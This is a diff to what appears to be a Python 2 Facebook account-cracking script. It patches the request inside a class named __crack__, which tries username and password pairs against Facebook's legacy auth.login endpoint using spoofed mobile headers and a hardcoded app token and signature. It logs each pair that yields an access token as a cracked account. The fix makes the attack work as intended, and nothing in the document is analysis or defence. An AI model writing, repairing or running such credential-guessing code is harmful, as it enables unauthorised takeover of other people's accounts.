@@ -665,7 +665,7 @@ class __crack__:
             headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': user_agent,'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
             params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
             api = 'https://b-api.facebook.com/method/auth.login'
-            response = requests.get(api, params=params , headers=headers_, user_agent=user_agent)
+            response = requests.get(api, params=params, headers=headers_)
             if re.search('(EAAA)\\w+', response.text):
                 print '\r %sID: %s|%s      %s' % (H,user,pw,N)
                 wrt = ' [✓] %s|%s' % (user,pw)
